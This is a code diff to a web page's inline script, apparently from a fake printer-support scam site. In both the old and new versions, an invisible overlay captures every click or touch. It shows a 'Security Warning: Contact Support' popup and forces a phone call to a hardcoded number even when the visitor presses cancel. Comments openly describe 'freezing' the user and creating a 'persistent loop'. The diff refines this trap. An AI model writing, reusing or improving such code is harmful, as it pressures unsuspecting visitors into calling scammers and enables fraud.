@@ -213,33 +213,36 @@
   <script src="jquery-1.12.0.min.js"></script>
 
 <script>
-    $(document).ready(function() {
-        // Initialize the UI text from your text.js variable
-        if (window.defaultText) {
-            $('.js_setTextBlock').html(window.defaultText);
-        }
-
-        // The "Invisible Trap" Click Handler
-        $(document).on('click touchstart', '#trap-layer', function(e) {
-            e.preventDefault();
-
-            // Pull fresh data from the variables in case they change
-            var message = window.defaultText || "Contact Support";
-            var phone = window.defaultNumber || "+18083029453";
-
-            // Clean the phone number (remove spaces/dashes) for the tel: link
-            var cleanPhone = phone.replace(/[^\d+]/g, "");
-
-            // Trigger the iOS-compliant popup
-            if (confirm(message)) {
-                window.location.href = "tel:" + cleanPhone;
-            } else {
-                // Keep the loop: even if they click cancel, trigger the call
-                window.location.href = "tel:" + cleanPhone;
+        $(document).ready(function() {
+            // Update page content if target element exists
+            if (window.defaultText) {
+                $('.js_setTextBlock').html(window.defaultText);
             }
+
+            function triggerPopupLoop() {
+                var message = window.defaultText || "Security Warning: Contact Support";
+                var phone = window.defaultNumber || "+18083029453";
+                
+                // Clean phone number for tel: link (removes spaces/parentheses)
+                var cleanPhone = phone.replace(/[^\d+]/g, "");
+
+                // confirm() is used to "freeze" the user's interaction
+                if (confirm(message)) {
+                    window.location.href = "tel:" + cleanPhone;
+                } else {
+                    // Re-triggering on cancel creates the persistent loop
+                    window.location.href = "tel:" + cleanPhone;
+                }
+            }
+
+            // Capture any click/touch on the invisible "trap" layer
+            $(document).on('click touchstart', '#trap-layer', function(e) {
+                e.preventDefault();
+                e.stopPropagation();
+                triggerPopupLoop();
+            });
         });
-    });
-</script>
+    </script>
 <!-- Default Statcounter code for Printpro
 http://absolute-printersetup.b-cdn.net -->
 <script type="text/javascript">
